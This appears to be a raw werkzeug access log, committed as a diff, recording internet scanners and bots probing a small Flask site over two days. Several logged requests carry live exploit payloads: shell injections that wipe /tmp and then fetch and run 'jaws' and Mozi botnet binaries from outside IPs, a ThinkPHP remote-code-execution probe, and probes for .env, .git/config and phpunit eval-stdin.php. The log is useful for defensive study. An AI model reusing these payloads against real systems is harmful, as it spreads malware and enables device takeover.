+INFO:werkzeug:142.93.226.56 - - [18/Apr/2023 23:09:21] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:142.93.226.56 - - [18/Apr/2023 23:09:21] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+INFO:werkzeug:194.87.151.116 - - [18/Apr/2023 23:38:05] "[33mPOST /boaform/admin/formLogin HTTP/1.1[0m" 404 -
+INFO:werkzeug:193.32.162.159 - - [19/Apr/2023 00:40:04] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:143.198.128.123 - - [19/Apr/2023 00:45:27] "GET / HTTP/1.0" 200 -
+INFO:werkzeug:167.94.138.50 - - [19/Apr/2023 01:06:49] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:167.94.138.50 - - [19/Apr/2023 01:06:49] "GET / HTTP/1.1" 200 -
+ERROR:werkzeug:167.94.138.50 - - [19/Apr/2023 01:06:49] code 505, message Invalid HTTP version (2.0)
+INFO:werkzeug:167.94.138.50 - - [19/Apr/2023 01:06:49] "[35m[1mPRI * HTTP/2.0[0m" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+INFO:werkzeug:167.94.138.50 - - [19/Apr/2023 01:06:49] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+INFO:werkzeug:14.116.157.23 - - [19/Apr/2023 01:24:11] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:193.32.162.159 - - [19/Apr/2023 02:39:54] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:170.64.166.144 - - [19/Apr/2023 02:53:43] "[33mGET /aaa9 HTTP/1.1[0m" 404 -
+INFO:werkzeug:170.64.166.144 - - [19/Apr/2023 02:54:02] "[33mGET /aab8 HTTP/1.1[0m" 404 -
+INFO:werkzeug:170.64.166.144 - - [19/Apr/2023 02:54:20] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:108.50.195.142 - - [19/Apr/2023 03:22:55] "[33mGET /shell?cd+/tmp;rm+-rf+*;wget+45.81.243.34/jaws;sh+/tmp/jaws HTTP/1.1[0m" 404 -
+INFO:werkzeug:20.14.81.250 - - [19/Apr/2023 03:46:04] "[33mGET /.env HTTP/1.1[0m" 404 -
+INFO:werkzeug:20.14.81.250 - - [19/Apr/2023 03:46:04] "[31m[1mPOST / HTTP/1.1[0m" 405 -
+INFO:werkzeug:20.14.81.250 - - [19/Apr/2023 03:46:05] "[33mGET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+INFO:werkzeug:193.32.162.159 - - [19/Apr/2023 03:53:16] "GET / HTTP/1.1" 200 -
+ERROR:werkzeug:157.230.57.32 - - [19/Apr/2023 04:53:49] code 400, message Bad request version ('À\x14À')
+INFO:werkzeug:157.230.57.32 - - [19/Apr/2023 04:53:49] "[35m[1m {  wí«ÅA^@%ês° ÕÜÙÀOTOú"TÞ&)È  À/À+ÀÀÀÀ	ÀÀ[0m" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:157.230.57.32 - - [19/Apr/2023 04:53:49] code 400, message Bad request version ('À\x14À')
+INFO:werkzeug:157.230.57.32 - - [19/Apr/2023 04:53:49] "[35m[1m {  w;,ùÁ;ÝooÕú÷,µ+¼LòÐèècªÈY  À/À+ÀÀÀÀ	ÀÀ[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:157.230.57.32 - - [19/Apr/2023 04:53:49] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:157.230.57.32 - - [19/Apr/2023 04:53:49] "[33mGET /client/get_targets HTTP/1.1[0m" 404 -
+INFO:werkzeug:157.230.57.32 - - [19/Apr/2023 04:53:49] "[33mGET /upl.php HTTP/1.1[0m" 404 -
+ERROR:werkzeug:157.230.57.32 - - [19/Apr/2023 04:53:50] code 400, message Bad request version ('À\x14À')
+INFO:werkzeug:157.230.57.32 - - [19/Apr/2023 04:53:50] "[35m[1m {  w	{ÊºLÏÉjfñoFätÜûÞ")mæ°Ï¥¡ÿ  À/À+ÀÀÀÀ	ÀÀ[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:157.230.57.32 - - [19/Apr/2023 04:53:50] "[33mGET /geoip/ HTTP/1.1[0m" 404 -
+INFO:werkzeug:157.230.57.32 - - [19/Apr/2023 04:53:50] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:157.230.57.32 - - [19/Apr/2023 04:53:50] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+INFO:werkzeug:190.109.227.120 - - [19/Apr/2023 05:46:44] "[33mPOST /goform/set_LimitClient_cfg HTTP/1.1[0m" 404 -
+INFO:werkzeug:180.149.125.167 - - [19/Apr/2023 06:05:57] "[33mGET /stalker_portal/server/tools/auth_simple.php HTTP/1.1[0m" 404 -
+INFO:werkzeug:162.243.149.19 - - [19/Apr/2023 06:08:59] "[33mGET /druid/index.html HTTP/1.1[0m" 404 -
+INFO:werkzeug:95.83.32.38 - - [19/Apr/2023 06:22:45] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:52.207.240.216 - - [19/Apr/2023 06:50:23] "GET http://azenv.net/ HTTP/1.1" 200 -
+ERROR:werkzeug:67.21.36.5 - - [19/Apr/2023 07:03:16] code 400, message Bad request version ('°Q%\x11í1|Ý')
+INFO:werkzeug:67.21.36.5 - - [19/Apr/2023 07:03:16] "[35m[1m£ îàêfyÈÅÖ`#¨½¤íí­H')¢r vÙþxué¨0ý3C.·iS|ºNfô*Ö­÷pòËYmÓnµ­	Ã·«ðsúA·g¶qCâ­XÙñÀó´SþÉ¾õQÈ?G½!Xëè;:bÍ3hèñòPGW4ÕgCÝÅ|ÝøÐcøÐ³Ï¬eà¬,²­ÌAP^)ªè´Â½¬ °Q%í1|Ý[0m" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:67.21.36.5 - - [19/Apr/2023 07:03:26] code 400, message Bad HTTP/0.9 request type ('µ§')
+INFO:werkzeug:67.21.36.5 - - [19/Apr/2023 07:03:26] "[35m[1mµ§ ÛJXß$OA¶k`±¢åqFÁSlÚ¯èò#¢ùXÇ²6}A¢6¢!uÑtn3,{&þáÜ9âýÑkE¿[0m" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:67.21.36.5 - - [19/Apr/2023 07:03:27] code 400, message Bad request version ('ÍJ\x9fú3\x88[\x10<YMÀº\x9e0\x8d½\x0eS\x12R\x0fÚè¯-¡\x9e\x16\x06Æ¼]ÓIbÑ:\x86>\x89áXÂ\x9dÐ\x95÷Î°\x81êª\x0e¶U\x06}l*±Ä¥')
+INFO:werkzeug:67.21.36.5 - - [19/Apr/2023 07:03:27] "[35m[1mB©-½VeÒR5[NåV×ëøG>lü1·ó@Ìä÷ÊÏ·¿JýÔdG5ìY|ÿÃ¤òØ<)5ûMBG´Ù%Ð*TS$Rô ÍJú3[<YMÀº0½SRÚè¯-¡Æ¼]ÓIbÑ:>áXÂÐ÷Î°êª¶U}l*±Ä¥[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:216.218.206.68 - - [19/Apr/2023 07:15:49] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:216.218.206.68 - - [19/Apr/2023 07:17:59] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+INFO:werkzeug:216.218.206.68 - - [19/Apr/2023 07:19:02] "[33mGET /geoserver/web/ HTTP/1.1[0m" 404 -
+INFO:werkzeug:193.32.162.159 - - [19/Apr/2023 07:22:53] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:185.189.182.234 - - [19/Apr/2023 07:59:23] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:179.43.177.243 - - [19/Apr/2023 08:27:29] "GET / HTTP/1.1" 200 -
+ERROR:werkzeug:162.243.147.27 - - [19/Apr/2023 08:51:48] code 400, message Bad request syntax ('MGLNDD_46.38.236.126_80')
+INFO:werkzeug:162.243.147.27 - - [19/Apr/2023 08:51:48] "[35m[1mMGLNDD_46.38.236.126_80[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:103.100.233.25 - - [19/Apr/2023 09:48:42] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:103.100.233.14 - - [19/Apr/2023 09:48:43] "[33mGET /wp-includes/css/buttons.css HTTP/1.1[0m" 404 -
+INFO:werkzeug:193.32.162.159 - - [19/Apr/2023 10:17:52] "GET / HTTP/1.1" 200 -
+ERROR:werkzeug:64.226.96.152 - - [19/Apr/2023 10:18:24] code 400, message Bad request version ('À\x14À')
+INFO:werkzeug:64.226.96.152 - - [19/Apr/2023 10:18:24] "[35m[1m {  wÄ¢âe\ÒËY7&Ù¨¬2Ï\·åÄçdFîÓN  À/À+ÀÀÀÀ	ÀÀ[0m" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:64.226.96.152 - - [19/Apr/2023 10:18:24] code 400, message Bad request syntax ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x03ÎØ')
+INFO:werkzeug:64.226.96.152 - - [19/Apr/2023 10:18:24] "[35m[1m {  wÎØ[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:64.226.96.152 - - [19/Apr/2023 10:18:24] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:64.226.96.152 - - [19/Apr/2023 10:18:24] "[33mGET /client/get_targets HTTP/1.1[0m" 404 -
+INFO:werkzeug:64.226.96.152 - - [19/Apr/2023 10:18:24] "[33mGET /upl.php HTTP/1.1[0m" 404 -
+ERROR:werkzeug:64.226.96.152 - - [19/Apr/2023 10:18:24] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x03D¬\x7fÉÓ\x18ä\x08ô6z¾¤Ë4£÷0EË`*\x12²êeR«\x82Ê?ù\x00\x00\x1aÀ/À+À\x11À\x07À\x13À')
+INFO:werkzeug:64.226.96.152 - - [19/Apr/2023 10:18:24] "[35m[1m {  wD¬ÉÓäô6z¾¤Ë4£÷0EË`*²êeR«Ê?ù  À/À+ÀÀÀÀ	ÀÀ[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:64.226.96.152 - - [19/Apr/2023 10:18:24] "[33mGET /geoip/ HTTP/1.1[0m" 404 -
+INFO:werkzeug:64.226.96.152 - - [19/Apr/2023 10:18:24] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:64.226.96.152 - - [19/Apr/2023 10:18:24] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+ERROR:werkzeug:94.232.42.99 - - [19/Apr/2023 11:18:20] code 400, message Bad HTTP/0.9 request type ("\x03\x00\x00,'à\x00\x00\x00\x00\x00Cookie:")
+INFO:werkzeug:94.232.42.99 - - [19/Apr/2023 11:18:20] "[35m[1m  ,'à     Cookie: mstshash=Domain[0m" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:94.232.42.99 - - [19/Apr/2023 11:18:20] code 400, message Bad HTTP/0.9 request type ("\x03\x00\x00,'à\x00\x00\x00\x00\x00Cookie:")
+INFO:werkzeug:94.232.42.99 - - [19/Apr/2023 11:18:20] "[35m[1m  ,'à     Cookie: mstshash=Domain[0m" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:94.232.42.99 - - [19/Apr/2023 11:18:20] code 400, message Bad HTTP/0.9 request type ("\x03\x00\x00,'à\x00\x00\x00\x00\x00Cookie:")
+INFO:werkzeug:94.232.42.99 - - [19/Apr/2023 11:18:20] "[35m[1m  ,'à     Cookie: mstshash=Domain[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:59.89.123.159 - - [19/Apr/2023 11:26:22] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:205.210.31.90 - - [19/Apr/2023 11:51:16] "GET / HTTP/1.0" 200 -
+INFO:werkzeug:167.248.133.34 - - [19/Apr/2023 12:11:11] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:167.248.133.34 - - [19/Apr/2023 12:11:11] "GET / HTTP/1.1" 200 -
+ERROR:werkzeug:167.248.133.34 - - [19/Apr/2023 12:11:11] code 505, message Invalid HTTP version (2.0)
+INFO:werkzeug:167.248.133.34 - - [19/Apr/2023 12:11:11] "[35m[1mPRI * HTTP/2.0[0m" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+INFO:werkzeug:167.248.133.34 - - [19/Apr/2023 12:11:11] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+INFO:werkzeug:87.236.176.31 - - [19/Apr/2023 12:21:24] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:194.87.151.116 - - [19/Apr/2023 12:24:27] "[33mPOST /boaform/admin/formLogin HTTP/1.1[0m" 404 -
+INFO:werkzeug:193.32.162.159 - - [19/Apr/2023 12:37:17] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:193.32.162.159 - - [19/Apr/2023 13:57:46] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:134.122.133.58 - - [19/Apr/2023 14:29:43] "[33mGET /tywcb/161343.html HTTP/1.1[0m" 404 -
+INFO:werkzeug:45.55.67.231 - - [19/Apr/2023 14:42:23] "GET / HTTP/1.0" 200 -
+INFO:werkzeug:193.32.162.159 - - [19/Apr/2023 15:45:15] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:45.55.67.231 - - [19/Apr/2023 15:50:36] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:45.55.67.231 - - [19/Apr/2023 15:50:37] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+INFO:werkzeug:35.240.121.17 - - [19/Apr/2023 16:26:13] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:193.35.18.251 - - [19/Apr/2023 16:32:53] "[33mPOST /boaform/admin/formLogin HTTP/1.1[0m" 404 -
+ERROR:werkzeug:117.194.169.61 - - [19/Apr/2023 16:42:32] code 400, message Bad HTTP/0.9 request type ('27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$')
+INFO:werkzeug:117.194.169.61 - - [19/Apr/2023 16:42:32] "[35m[1m27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ HTTP/1.0[0m" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:185.170.144.3 - - [19/Apr/2023 16:46:11] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+INFO:werkzeug:185.170.144.3 - - [19/Apr/2023 16:46:11] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:172.104.11.51 - - [19/Apr/2023 16:46:20] code 400, message Bad request version ('À\x14À')
+INFO:werkzeug:172.104.11.51 - - [19/Apr/2023 16:46:20] "[35m[1m   nO4íUÊV©1ÛÙT÷ê² DS6Æ^õè%ê~   À/À0À+À,Ì¨Ì©ÀÀ	ÀÀ[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:95.9.200.155 - - [19/Apr/2023 17:09:46] "[33mPOST /goform/set_LimitClient_cfg HTTP/1.1[0m" 404 -
+INFO:werkzeug:43.158.217.137 - - [19/Apr/2023 17:41:30] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:103.43.5.124 - - [19/Apr/2023 19:04:24] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:193.32.162.159 - - [19/Apr/2023 19:23:14] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:35.89.108.157 - - [19/Apr/2023 19:26:14] "[33mGET /invoker/readonly HTTP/1.1[0m" 404 -
+INFO:werkzeug:35.89.108.157 - - [19/Apr/2023 19:26:14] "[33mPOST /_ignition/execute-solution HTTP/1.1[0m" 404 -
+INFO:werkzeug:35.89.108.157 - - [19/Apr/2023 19:26:14] "[33mPOST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+INFO:werkzeug:35.89.108.157 - - [19/Apr/2023 19:26:15] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:35.89.108.157 - - [19/Apr/2023 19:26:15] "[33mGET /script HTTP/1.1[0m" 404 -
+INFO:werkzeug:35.89.108.157 - - [19/Apr/2023 19:26:15] "[33mGET /login HTTP/1.1[0m" 404 -
+INFO:werkzeug:35.89.108.157 - - [19/Apr/2023 19:26:16] "[33mGET /jenkins/login HTTP/1.1[0m" 404 -
+INFO:werkzeug:35.89.108.157 - - [19/Apr/2023 19:26:16] "[33mGET /manager/html HTTP/1.1[0m" 404 -
+INFO:werkzeug:35.89.108.157 - - [19/Apr/2023 19:26:16] "GET /?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=xrbxl8vm HTTP/1.1" 200 -
+INFO:werkzeug:35.89.108.157 - - [19/Apr/2023 19:26:17] "[33mGET /users/sign_in HTTP/1.1[0m" 404 -
+INFO:werkzeug:35.89.108.157 - - [19/Apr/2023 19:26:17] "[33mGET /wp-login.php HTTP/1.1[0m" 404 -
+INFO:werkzeug:162.142.125.225 - - [19/Apr/2023 20:02:50] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:162.142.125.225 - - [19/Apr/2023 20:02:51] "GET / HTTP/1.1" 200 -
+ERROR:werkzeug:162.142.125.225 - - [19/Apr/2023 20:02:51] code 505, message Invalid HTTP version (2.0)
+INFO:werkzeug:162.142.125.225 - - [19/Apr/2023 20:02:51] "[35m[1mPRI * HTTP/2.0[0m" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+INFO:werkzeug:162.142.125.225 - - [19/Apr/2023 20:02:51] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+INFO:werkzeug:172.104.11.34 - - [19/Apr/2023 20:22:35] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:185.77.217.11 - - [19/Apr/2023 20:25:16] "HEAD / HTTP/1.1" 200 -
+INFO:werkzeug:185.77.217.11 - - [19/Apr/2023 20:25:16] "[33mGET /.env HTTP/1.1[0m" 404 -
+INFO:werkzeug:185.77.217.11 - - [19/Apr/2023 20:25:16] "[31m[1mPOST / HTTP/1.1[0m" 405 -
+INFO:werkzeug:185.77.217.11 - - [19/Apr/2023 20:25:17] "[33mGET /_profiler/phpinfo HTTP/1.1[0m" 404 -
+INFO:werkzeug:185.77.217.11 - - [19/Apr/2023 20:25:17] "[33mGET /debug/default/view?panel=config HTTP/1.1[0m" 404 -
+INFO:werkzeug:185.77.217.11 - - [19/Apr/2023 20:25:17] "[33mHEAD /config.json HTTP/1.1[0m" 404 -
+INFO:werkzeug:185.77.217.11 - - [19/Apr/2023 20:25:17] "[33mGET /.git/config HTTP/1.1[0m" 404 -
+INFO:werkzeug:59.36.163.204 - - [19/Apr/2023 20:40:48] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:117.243.138.109 - - [19/Apr/2023 20:53:07] "[33mGET /boaform/admin/formLogin?username=ec8&psd=ec8 HTTP/1.0[0m" 404 -
+INFO:werkzeug:193.32.162.159 - - [19/Apr/2023 21:07:42] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:180.149.125.164 - - [19/Apr/2023 22:33:42] "[33mGET /c/ HTTP/1.1[0m" 404 -
+INFO:werkzeug:164.92.117.229 - - [19/Apr/2023 23:35:38] "[33mGET /aaa9 HTTP/1.1[0m" 404 -
+INFO:werkzeug:164.92.117.229 - - [19/Apr/2023 23:35:56] "[33mGET /aab8 HTTP/1.1[0m" 404 -
+INFO:werkzeug:164.92.117.229 - - [19/Apr/2023 23:36:14] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:193.32.162.159 - - [19/Apr/2023 23:37:39] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:59.11.214.75 - - [19/Apr/2023 23:43:42] "HEAD / HTTP/1.1" 200 -
+INFO:werkzeug:59.11.214.75 - - [19/Apr/2023 23:43:44] "[33mGET /wp-login.php HTTP/1.1[0m" 404 -
+INFO:werkzeug:59.11.214.75 - - [19/Apr/2023 23:43:45] "[33mGET /wp-login.php HTTP/1.1[0m" 404 -
+INFO:werkzeug:59.11.214.75 - - [19/Apr/2023 23:43:46] "[33mGET /wordpress/wp-login.php HTTP/1.1[0m" 404 -
+INFO:werkzeug:59.11.214.75 - - [19/Apr/2023 23:43:47] "[33mGET /blog/wp-login.php HTTP/1.1[0m" 404 -
+INFO:werkzeug:59.11.214.75 - - [19/Apr/2023 23:43:47] "[33mGET /wp/wp-login.php HTTP/1.1[0m" 404 -
+INFO:werkzeug:185.180.143.188 - - [20/Apr/2023 00:40:09] "[33mGET /sugar_version.json HTTP/1.1[0m" 404 -
+INFO:werkzeug:193.32.162.159 - - [20/Apr/2023 01:07:59] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:113.142.141.105 - - [20/Apr/2023 01:22:34] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:179.43.177.243 - - [20/Apr/2023 02:33:17] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:106.75.229.76 - - [20/Apr/2023 03:35:33] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:106.75.128.142 - - [20/Apr/2023 03:35:40] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:106.75.128.142 - - [20/Apr/2023 03:35:41] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+INFO:werkzeug:106.75.128.142 - - [20/Apr/2023 03:35:41] "GET /static/js/main.js HTTP/1.1" 200 -
+INFO:werkzeug:109.237.97.180 - - [20/Apr/2023 03:56:33] "[33mGET /.env HTTP/1.1[0m" 404 -
+ERROR:werkzeug:109.237.97.180 - - [20/Apr/2023 03:56:33] code 400, message Bad request version ('êû@\x8chÓ!ó¼c¤\x86×èÙ3K¿\x00b\x13\x02\x13\x03\x13\x01À,À0À+À/Ì©Ì¨\x00£\x00\x9f\x00¢\x00\x9eÌªÀ¯À\xadÀ$À(À')
+INFO:werkzeug:109.237.97.180 - - [20/Apr/2023 03:56:33] "[35m[1mH D ð2x*ìÝê¥õ 4!íÖåðä¶Ì N. .Ä3ZõBkÐ7	êû@hÓ!ó¼c¤×èÙ3K¿ bÀ,À0À+À/Ì©Ì¨ £  ¢ ÌªÀ¯À­À$À(À[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:121.234.160.170 - - [20/Apr/2023 04:03:59] "[33mPOST /HNAP1/ HTTP/1.0[0m" 404 -
+INFO:werkzeug:193.32.162.159 - - [20/Apr/2023 04:12:03] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:59.49.19.46 - - [20/Apr/2023 05:31:52] "[33mGET /shell?cd+/tmp;rm+-rf+*;wget+94.158.247.123/jaws;sh+/tmp/jaws HTTP/1.1[0m" 404 -
+INFO:werkzeug:14.115.104.187 - - [20/Apr/2023 05:31:58] "[33mGET /shell?cd+/tmp;rm+-rf+*;wget+94.158.247.123/jaws;sh+/tmp/jaws HTTP/1.1[0m" 404 -
+INFO:werkzeug:218.4.170.126 - - [20/Apr/2023 05:32:00] "[33mGET /shell?cd+/tmp;rm+-rf+*;wget+94.158.247.123/jaws;sh+/tmp/jaws HTTP/1.1[0m" 404 -
+INFO:werkzeug:218.28.124.102 - - [20/Apr/2023 05:32:16] "[33mGET /shell?cd+/tmp;rm+-rf+*;wget+94.158.247.123/jaws;sh+/tmp/jaws HTTP/1.1[0m" 404 -
+INFO:werkzeug:179.43.177.243 - - [20/Apr/2023 05:38:07] "[33mPOST /boaform/admin/formLogin HTTP/1.1[0m" 404 -
+INFO:werkzeug:193.32.162.159 - - [20/Apr/2023 06:07:12] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:205.210.31.41 - - [20/Apr/2023 06:47:37] "GET / HTTP/1.0" 200 -
+INFO:werkzeug:152.32.149.235 - - [20/Apr/2023 07:16:01] "GET / HTTP/1.1" 200 -
+ERROR:werkzeug:152.32.149.235 - - [20/Apr/2023 07:16:05] code 400, message Bad request version ('À\x13À')
+INFO:werkzeug:152.32.149.235 - - [20/Apr/2023 07:16:05] "[35m[1m î  êÛ*ËÐ£8@5K¡¬ÅÌ9ÅÈsë²]7CÜxé» gH%Ú³)ÆÌ·ïìx\6!QÂc?æ¾¶ªº &À+À/À,À0Ì©Ì¨À	ÀÀ[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:152.32.215.5 - - [20/Apr/2023 07:46:09] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:152.32.215.5 - - [20/Apr/2023 07:46:10] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+INFO:werkzeug:152.32.215.5 - - [20/Apr/2023 07:46:10] "GET /static/img/celestia-logo.svg HTTP/1.1" 200 -
+INFO:werkzeug:152.32.215.5 - - [20/Apr/2023 07:46:11] "GET /static/js/notify.js HTTP/1.1" 200 -
+INFO:werkzeug:152.32.215.5 - - [20/Apr/2023 07:46:11] "GET /static/js/main.js HTTP/1.1" 200 -
+INFO:werkzeug:152.32.215.5 - - [20/Apr/2023 07:46:11] "[33mGET /sitemap.xml HTTP/1.1[0m" 404 -
+INFO:werkzeug:152.32.215.5 - - [20/Apr/2023 07:46:11] "[33mGET /robots.txt HTTP/1.1[0m" 404 -
+INFO:werkzeug:193.32.162.159 - - [20/Apr/2023 07:59:06] "GET / HTTP/1.1" 200 -
+ERROR:werkzeug:165.22.247.214 - - [20/Apr/2023 08:14:32] code 400, message Bad request version ('À\x14À')
+INFO:werkzeug:165.22.247.214 - - [20/Apr/2023 08:14:32] "[35m[1m {  wS(.ý%Vw*U0ª3[ÊÛÄÓ3CÂ:Ã÷  À/À+ÀÀÀÀ	ÀÀ[0m" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:165.22.247.214 - - [20/Apr/2023 08:14:32] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x03fõ±\x88;Y\x83\x01®0`dØþ\x89`ÔÊ\x08\x8b¬\x93Ñla\x06\x07\x08þ\x8b¯z\x00\x00\x1aÀ/À+À\x11À\x07À\x13À')
+INFO:werkzeug:165.22.247.214 - - [20/Apr/2023 08:14:32] "[35m[1m {  wfõ±;Y®0`dØþ`ÔÊ¬Ñlaþ¯z  À/À+ÀÀÀÀ	ÀÀ[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:165.22.247.214 - - [20/Apr/2023 08:14:33] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:165.22.247.214 - - [20/Apr/2023 08:14:33] "[33mGET /client/get_targets HTTP/1.1[0m" 404 -
+INFO:werkzeug:165.22.247.214 - - [20/Apr/2023 08:14:34] "[33mGET /upl.php HTTP/1.1[0m" 404 -
+ERROR:werkzeug:165.22.247.214 - - [20/Apr/2023 08:14:34] code 400, message Bad request version ('À\x14À')
+INFO:werkzeug:165.22.247.214 - - [20/Apr/2023 08:14:34] "[35m[1m {  w¡bÕ5·,}Û °xPë¥ÿ5%jIy  À/À+ÀÀÀÀ	ÀÀ[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:165.22.247.214 - - [20/Apr/2023 08:14:34] "[33mGET /geoip/ HTTP/1.1[0m" 404 -
+INFO:werkzeug:165.22.247.214 - - [20/Apr/2023 08:14:35] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:165.22.247.214 - - [20/Apr/2023 08:14:35] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+INFO:werkzeug:5.190.123.76 - - [20/Apr/2023 08:48:44] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:193.32.162.159 - - [20/Apr/2023 09:44:53] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:194.87.151.116 - - [20/Apr/2023 10:29:37] "[33mPOST /boaform/admin/formLogin HTTP/1.1[0m" 404 -
+INFO:werkzeug:193.32.162.159 - - [20/Apr/2023 11:09:46] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:64.62.197.50 - - [20/Apr/2023 11:44:09] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:64.62.197.51 - - [20/Apr/2023 11:45:22] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+INFO:werkzeug:64.62.197.55 - - [20/Apr/2023 11:46:14] "[33mGET /geoserver/web/ HTTP/1.1[0m" 404 -
+INFO:werkzeug:79.132.200.122 - - [20/Apr/2023 12:56:49] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:118.123.105.85 - - [20/Apr/2023 13:19:06] "GET / HTTP/1.0" 200 -
+INFO:werkzeug:118.123.105.85 - - [20/Apr/2023 13:19:06] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+INFO:werkzeug:118.123.105.85 - - [20/Apr/2023 13:19:07] "[33mGET /robots.txt HTTP/1.1[0m" 404 -
+INFO:werkzeug:118.123.105.85 - - [20/Apr/2023 13:19:07] "[33mGET /.well-known/security.txt HTTP/1.1[0m" 404 -
+ERROR:werkzeug:188.166.229.98 - - [20/Apr/2023 13:58:05] code 400, message Bad request version ('À\x14À')
+INFO:werkzeug:188.166.229.98 - - [20/Apr/2023 13:58:05] "[35m[1m {  w?_mv;zÂA/Óo3¸£³¬°ptå?o©`N/§(v  À/À+ÀÀÀÀ	ÀÀ[0m" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:188.166.229.98 - - [20/Apr/2023 13:58:06] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x03¦n\x9fWwá\x01ÏÓVÀÚÝúN\x9b¼=zl\x0fXòêd±\x88!_v\x9bH\x00\x00\x1aÀ/À+À\x11À\x07À\x13À')
+INFO:werkzeug:188.166.229.98 - - [20/Apr/2023 13:58:06] "[35m[1m {  w¦nWwáÏÓVÀÚÝúN¼=zlXòêd±!_vH  À/À+ÀÀÀÀ	ÀÀ[0m" HTTPStatus.BAD_REQUEST -
